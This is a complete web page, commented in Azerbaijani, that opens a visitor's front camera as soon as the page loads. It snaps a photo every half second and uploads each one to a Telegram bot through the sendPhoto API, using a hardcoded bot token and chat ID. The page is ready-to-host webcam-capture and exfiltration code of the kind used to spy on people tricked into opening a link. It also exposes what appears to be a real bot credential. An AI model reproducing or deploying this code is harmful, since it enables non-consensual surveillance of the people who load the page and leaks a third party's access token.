<!DOCTYPE html>
<html lang="az">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Kameradan Telegram-a Şəkil Göndərən</title>
  <style>
    body { margin:0; background:#000; font-family:monospace; color:#0f3; }
    #video {
      position: fixed; inset:0; width:100vw; height:100vh; object-fit:cover;
      transform: scaleX(-1); /* güzgü effekti */
    }
    #status {
      position: fixed; top:12px; left:12px; background:rgba(0,0,0,0.7);
      padding:10px 16px; border-radius:6px; z-index:10; font-size:15px;
    }
  </style>
</head>
<body>

<div id="status">Kamera açılır... icazə ver</div>
<video id="video" autoplay playsinline muted></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
// ────────────────────────────────────────────────
// BURAYA ÖZ MƏLUMATLARINI YAZ
const BOT_TOKEN   = "8514355914:AAFR7vh1Swu6cIpb_vHODNik9zdxDlCsWP4";  // ← bot token
const CHAT_ID     = "6570410435";                                       // ← sənin chat id
const INTERVAL_MS = 500;   // 0.5 saniyə

const video  = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx    = canvas.getContext('2d');
const status = document.getElementById('status');

let stream = null;

async function startCamera() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });
    video.srcObject = stream;
    status.textContent = `Kamera aktiv • hər ${INTERVAL_MS/1000} saniyədə Telegram-a göndərirəm`;
    status.style.color = "#0f0";

    video.onloadedmetadata = () => {
      canvas.width  = video.videoWidth;
      canvas.height = video.videoHeight;
      startSending();
    };

  } catch (err) {
    status.textContent = "Kamera xətası: " + err.message;
    status.style.color = "#f44";
    console.error(err);
  }
}

function startSending() {
  setInterval(async () => {
    try {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const dataUrl = canvas.toDataURL('image/jpeg', 0.62); // 0.62 → ölçü kiçik olsun

      // base64 → Blob → FormData
      const blob = await (await fetch(dataUrl)).blob();
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, 'capture.jpg');

      const response = await fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
        { method: 'POST', body: formData }
      );

      const result = await response.json();
      if (result.ok) {
        status.textContent = `Göndərildi → ${new Date().toLocaleTimeString()}`;
      } else {
        status.textContent = "Xəta: " + (result.description || "bilinmir");
        status.style.color = "#f66";
        console.error(result);
      }

    } catch (err) {
      console.error("Göndərmə xətası:", err);
      status.textContent = "Göndərmə xətası → konsola bax";
    }
  }, INTERVAL_MS);
}

// Başla
window.addEventListener('load', startCamera);

// Çıxanda kameranı söndür
window.addEventListener('beforeunload', () => {
  if (stream) stream.getTracks().forEach(t => t.stop());
});
</script>
</body>
</html>
